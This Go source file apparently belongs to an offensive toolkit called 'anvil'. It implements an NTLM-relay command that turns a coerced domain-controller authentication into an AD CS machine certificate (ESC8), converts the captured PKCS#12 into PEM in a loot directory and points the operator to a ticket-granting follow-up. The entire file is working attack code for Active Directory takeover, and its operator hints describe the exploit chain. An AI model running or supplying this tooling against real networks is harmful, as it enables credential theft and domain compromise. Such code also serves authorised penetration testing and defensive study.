package cli

import (
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"

	"encoding/pem"

	"github.com/mandiant/gopacket/pkg/relay"
	"github.com/spf13/cobra"
	pkcs12 "software.sslmate.com/src/go-pkcs12"

	"anvil/internal/smbclient"
	"anvil/internal/ui"
)

// newRelayCmd implements `anvil relay`: an NTLM-relay listener that turns a
// coerced machine-account authentication into an AD CS certificate (ESC8).
// gopacket's pkg/relay provides the listener and the ICPR attack; anvil
// adds the loot-file conventions and the conversion from the attack's
// PKCS#12 output to the PEM layout `gettgt --cert` reads.
//
// The operator's chain: `anvil relay --ca <CA-NAME> --target <ca-host>`
// here, then `coerce printerbug <this-ip> 445` from a connect shell — the
// DC's machine account calls back, its relayed auth requests a Machine
// cert, and the result lands as a PEM in the loot directory.
func newRelayCmd() *cobra.Command {
	var caName, target, template, altName, lootDir string
	var smbPort int
	var rpcListen bool
	var wait time.Duration

	cmd := &cobra.Command{
		Use:   "relay --ca <CA-NAME> --target <ca-host>",
		Short: "NTLM relay to AD CS (ESC8): relayed machine auth becomes a certificate",
		Args:  cobra.NoArgs,
		RunE: func(cmd *cobra.Command, args []string) error {
			if caName == "" || target == "" {
				return fmt.Errorf("--ca and --target are both required (e.g. --ca HACKERBLUEPRINT-CA --target dc01.hackerblueprint.local)")
			}
			if !strings.Contains(target, "://") {
				target = "rpc://" + target
			}
			if lootDir == "" {
				home, err := os.UserHomeDir()
				if err != nil {
					return err
				}
				lootDir = filepath.Join(home, ".anvil", "loot", "relay")
			}

			cfg := &relay.Config{
				TargetAddr:    target,
				ListenAddr:    fmt.Sprintf(":%d", smbPort),
				RPCMode:       "ICPR",
				ICPRCAName:    caName,
				Attack:        "icpr",
				Template:      template,
				AltName:       altName,
				LootDir:       lootDir,
				NoHTTPServer:  true,
				NoWCFServer:   true,
				NoRawServer:   true,
				NoWinRMServer: true,
				NoRPCServer:   !rpcListen,
				Debug:         flagDebug,
			}

			// The relay logs through stdlib log; keep its voice on stdout so
			// its stage lines sit in the same stream as ours.
			log.SetOutput(os.Stdout)
			shown := template
			if shown == "" {
				shown = "auto (Machine for computer accounts, User otherwise)"
			}
			ui.Muted.Printf("RELAY  %s on %s\n", caName, target)
			ui.Faint.Printf("  template: %s\n", shown)
			ui.Faint.Printf("  SMB listener on :%d — now fire `coerce printerbug <this-ip> %d` at the DC; its machine account's relayed auth requests the cert here\n", smbPort, smbPort)
			if wait > 0 {
				ui.Faint.Printf("  giving up after %s with no coerced connection\n", wait)
			}

			errCh := make(chan error, 1)
			go func() { errCh <- relay.Run(cfg) }()

			deadline := time.NewTimer(wait)
			defer deadline.Stop()
			tick := time.NewTicker(2 * time.Second)
			defer tick.Stop()
			for {
				select {
				case err := <-errCh:
					return err
				case <-deadline.C:
					return fmt.Errorf("no coerced connection within %s", wait)
				case <-tick.C:
					if pfx := newestPFX(lootDir); pfx != "" {
						return finishRelay(pfx, lootDir)
					}
				}
			}
		},
	}

	f := cmd.Flags()
	f.StringVar(&caName, "ca", "", "CA common name to request the certificate from (required)")
	f.StringVar(&target, "target", "", "CA host, FQDN or IP (rpc:// prefix optional) (required)")
	f.StringVar(&template, "template", "", "certificate template override (default: Machine for computer accounts, User otherwise)")
	f.StringVar(&altName, "alt-name", "", "subjectAltName UPN to request")
	f.IntVar(&smbPort, "smb-port", 445, "SMB relay listener port (PrinterBug callbacks are always to :445)")
	f.BoolVar(&rpcListen, "rpc", false, "also run the RPC relay listener on :135")
	f.StringVar(&lootDir, "loot", "", "loot directory (default ~/.anvil/loot/relay)")
	f.DurationVar(&wait, "wait", 10*time.Minute, "give up waiting for a coerced connection after this")
	return cmd
}

// newestPFX returns the most recently modified .pfx in dir, "" when none
// exists yet. The directory is created by the attack on first capture, so
// absence of the directory is a normal waiting state, not an error.
func newestPFX(dir string) string {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return ""
	}
	var newest string
	var newestTime time.Time
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(strings.ToLower(e.Name()), ".pfx") {
			continue
		}
		fi, err := e.Info()
		if err != nil || fi.ModTime().Before(newestTime) {
			continue
		}
		newest, newestTime = filepath.Join(dir, e.Name()), fi.ModTime()
	}
	return newest
}

// finishRelay converts the attack's PKCS#12 to the PEM layout
// `gettgt --cert` reads (issued cert block + PKCS#8 key block, 0600, in
// the loot directory) and prints the follow-on hint.
func finishRelay(pfxPath, lootDir string) error {
	data, err := os.ReadFile(pfxPath)
	if err != nil {
		return fmt.Errorf("read captured certificate: %v", err)
	}
	blocks, err := pkcs12.ToPEM(data, "")
	if err != nil {
		return fmt.Errorf("decode PKCS#12 %s: %v", filepath.Base(pfxPath), err)
	}
	var certPEM, keyPEM []byte
	for _, b := range blocks {
		switch {
		case b.Type == "CERTIFICATE" && certPEM == nil:
			certPEM = append(certPEM, pem.EncodeToMemory(b)...)
		case strings.Contains(b.Type, "PRIVATE KEY") && keyPEM == nil:
			keyPEM = append(keyPEM, pem.EncodeToMemory(b)...)
		}
	}
	if certPEM == nil || keyPEM == nil {
		return fmt.Errorf("PKCS#12 %s holds no cert+key pair", filepath.Base(pfxPath))
	}

	pemPath := strings.TrimSuffix(pfxPath, filepath.Ext(pfxPath)) + ".pem"
	if err := smbclient.WriteCertPEM(pemPath, certPEM, keyPEM); err != nil {
		return fmt.Errorf("write PEM: %v", err)
	}
	ui.Accent.Printf("  certificate captured\n")
	fmt.Printf("  %s%s\n", ui.Muted.Sprintf("%-15s", "pfx"), pfxPath)
	fmt.Printf("  %s%s\n", ui.Muted.Sprintf("%-15s", "pem"), pemPath)
	ui.Faint.Printf("use: anvil gettgt --cert %s -d <domain>\n", pemPath)
	return nil
}
